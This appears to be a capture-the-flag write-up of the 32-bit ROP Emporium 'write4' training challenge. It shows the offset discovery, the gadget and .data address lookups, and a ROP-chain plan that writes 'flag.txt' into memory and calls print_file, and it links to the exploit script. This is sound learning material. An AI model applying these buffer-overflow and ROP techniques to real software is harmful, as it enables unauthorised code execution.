### Write ROPEmporium

### Binary Exploitation

#### Here's the basic description about this challenge
![image](https://user-images.githubusercontent.com/113513376/221390827-ac888633-0d3d-4eeb-9169-327af8c30de5.png)
![image](https://user-images.githubusercontent.com/113513376/221390833-78c42820-3c87-4c0e-9f3a-e8ef07bb9884.png)

Cool lets start with the basic file check 

```
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/write4/32bits]
└─$ file write432 
write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/write4/32bits]
└─$ checksec --format=json --file=write432 | jq     
{
  "write432": {
    "relro": "partial",
    "canary": "no",
    "nx": "yes",
    "pie": "no",
    "rpath": "no",
    "runpath": "yes",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "0"
  }
}
```

We're working with a x86 binary and from the protections check we know that only NX is enable

I'll run it to know what it does. But as usual it prints the same stuff

```
└─$ ./write432 
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> yea
Thank you!
```

I'll decompile the binary using ghidra
![image](https://user-images.githubusercontent.com/113513376/221391044-38c02917-2504-4ccc-975f-1cc5f44e8e1a.png)

There's just 1 function which is pwnme() 

So lets get the offset needed to overwrite the EIP

```
└─$ gdb-gef -q write432    
Reading symbols from write432...
(No debugging symbols found in write432)
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/RopEmperium/write4/32bits/write432 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0xf7e1e9b8  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffd020  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08048550  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd020│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"    ← $esp
0xffffd024│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n[...]"
0xffffd028│+0x0008: 0x6161616f
0xffffd02c│+0x000c: 0x61616170
0xffffd030│+0x0010: 0x61616171
0xffffd034│+0x0014: 0x61616172
0xffffd038│+0x0018: 0x61616173
0xffffd03c│+0x001c: 0x61616174
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "write432", stopped 0x6161616c in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
gef➤ 
```

Cool the offset is `44`

Looking at the usefulFunction() we see it attempts to print out the file nonexistent
![image](https://user-images.githubusercontent.com/113513376/221391112-532970c9-097f-457c-9ff4-195e622a3ed9.png)

So our goal is to make it print out the file `flag.txt` instead of `nonexistent`

From reading the description to goal is to write to a section of the memory using mov call

First i need to know what function is left for us and i'll use gdb for it

```
└─$ gdb-pwndbg -q write432 
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 138 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Pwndbg resolves kernel memory maps by parsing page tables (default) or via monitor info mem QEMU gdbstub command (use set kernel-vmmap-via-page-tables off for that)
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0804837c  _init
0x080483b0  pwnme@plt
0x080483c0  __libc_start_main@plt
0x080483d0  print_file@plt
0x080483e0  __gmon_start__@plt
0x080483f0  _start
0x08048430  _dl_relocate_static_pie
0x08048440  __x86.get_pc_thunk.bx
0x08048450  deregister_tm_clones
0x08048490  register_tm_clones
0x080484d0  __do_global_dtors_aux
0x08048500  frame_dummy
0x08048506  main
0x0804852a  usefulFunction
0x08048543  usefulGadgets
0x08048550  __libc_csu_init
0x080485b0  __libc_csu_fini
0x080485b4  _fini
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:     mov    DWORD PTR [edi],ebp
   0x08048545 <+2>:     ret    
   0x08048546 <+3>:     xchg   ax,ax
   0x08048548 <+5>:     xchg   ax,ax
   0x0804854a <+7>:     xchg   ax,ax
   0x0804854c <+9>:     xchg   ax,ax
   0x0804854e <+11>:    xchg   ax,ax
End of assembler dump.
pwndbg> 
```

They gave us a gadget to use and write to the memory 

Now where should we write in 🤔

We just need a portion of the binary where there's free space to at least hold up 8bytes of data since `flag.txt` is 8byte

Using `readelf` i see that .data section has `WA (Write & Allocate )`

```
└─$ readelf -S write432 
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048324 000324 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485b4 0005b4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485dc 0005dc 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048620 000620 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), p (processor specific)
```

Note that .data has 8bytes of free space and it can be confirmed by checking it in ghidra
![image](https://user-images.githubusercontent.com/113513376/221391354-dbe9c969-1236-4173-94a2-fab45c3b8c5f.png)

From there we know the address of the .data section is :

```
Address = 0x804a018
```

Cool we know that the gadget given to use for write to memory is : `0x08048543`

```
 0x08048543 <+0>:     mov    DWORD PTR [edi],ebp
 ```

Since we will need to fill up the value of ebp and edi we need a pop gadget 

Here's how it goes:

```
mov    DWORD PTR [edi],ebp means that its moving the value of saved ebp to the pointer of edi
```

We need to:

```
pop the value of .data and store it in edi, then pop the string 'flag.txt' into ebp
```

So when we do that we can then call the mov gadget which will then:

```
mov the value of ebp (flag.txt) into the edi (.data section)
```

With this lets get the gadget for it and i'll use ropper

```
└─$ ropper --file write432 --search "pop edi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop edi

[INFO] File: write432
0x080485aa: pop edi; pop ebp; ret; 
```

Nice now here's how the final exploit is going to be:

```
1. First we will overflow the buffer 
2. Then move the value of flag.txt to .data
3. Use the print_file function to read the content of .data therefore making it read flag.txt

And in order to move the value of flag.txt to .data, i'll do this

1. pop the value of both .data & flag into the edi and ebp registers respectively 
2. then pop the value of .data & .txt into the edi and ebp registers respectively 
3. With the edi and ebp register occupied with our value i'll move the value of ebp to edi
4. Then call printfile(.data)
```

Note that we can't just directly put in flag.txt in to ebp since its a x86 binary we need to put in 4 bytes at a time thats why i separated `flag & .txt` in the exploit script  

Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/write/exploit32.py)

Running it works 

```
└─$ python3 exploit.py
[+] Starting local process './write432': pid 136934
[*] data address 0x804a018
[*] pop edi; pop ebp 0x80485aa
[*] mov  dword ptr [edi], ebp; 0x8048543
[*] prinft file function address 0x80483d0
[+] ROPE{a_placeholder_32byte_flag!}
[*] Stopped process './write432' (pid 136934)
```

Here's the solution for the x64 binary ................coming soon i when i come back from church today
